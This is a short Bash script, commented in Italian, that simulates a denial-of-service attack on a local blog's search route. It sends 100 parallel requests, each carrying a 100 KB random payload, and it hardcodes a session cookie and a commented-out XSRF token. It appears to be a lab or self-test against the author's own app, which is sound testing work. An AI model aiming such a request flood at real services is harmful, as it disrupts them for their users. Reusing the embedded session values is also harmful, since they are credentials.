#!/bin/bash

# URL della rotta da attaccare
URL="http://localhost:8000/articles/search"

# Generare un grande payload casuale
LARGE_PAYLOAD=$(head -c 100000 < /dev/urandom | base64)

# Numero di richieste da inviare
NUM_REQUESTS=100

#XSRF_TOKEN="eyJpdiI6IitkSkNzVTBsbko2d0x3TVJIUUNnOFE9PSIsInZhbHVlIjoiRSs5aUdBRWpMTnlXT3RWVm9nSjBhbUQraDl5dkFlNDArMjBZb3R0aHRzaW1va3p2N3lCVUp5R1crNThLVkRuQlkzSE5vQkNHY21UOUlGT2wwcXY2Um8xcU5odzVRQXVtU1dlY251ejBsNVRRbERHV1plcDVSamkyNXE1dWc2YVEiLCJtYWMiOiI4MDZhMjYxNGZhZWZiMmJhNGZlM2Q3NWIxMTkzN2FjMWY0N2M0ZTAxZWEzZGI2NTM0MmY2YWE2NjYxOTFkZTc3IiwidGFnIjoiIn0%3D"

SESSION_COOKIE="cyberblog_session=eyJpdiI6ImpLZzN3WFh0b0tpVElObmMxM1UrZ0E9PSIsInZhbHVlIjoiVXdOZmZJVWxMbUtoMkhtbmRRd09lcmpIdTh4L0xrRm4wdUVGNEhWL25BMnhleG1lRVBnWno1eE1uS3lKWHhwWnNvMVN1RmdzZHFXUnk4cjhuZFNxbE5OQ1l6ZXMvRWJmRUhtQzBlMjNUT3FIZENhWncxVHJkdURLUk53RXVOTjgiLCJtYWMiOiI0MjEzOTM2ZjZkYzZkMGI5NGQxYTI4MWJlYjEwNTgxNTA4YjJlNjFhNTg5N2U4ZDYyYzdmMDYyZDE0YWM3MmE5IiwidGFnIjoiIn0%3D"

# Funzione per eseguire la richiesta
send_request() {
    curl -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null 2>&1
}

echo "Inizio attacco DoS simulato..."

# Loop per inviare tante richieste
for ((i=1; i<=NUM_REQUESTS; i++))
do
    send_request &
    echo "Richiesta $i inviata"
done
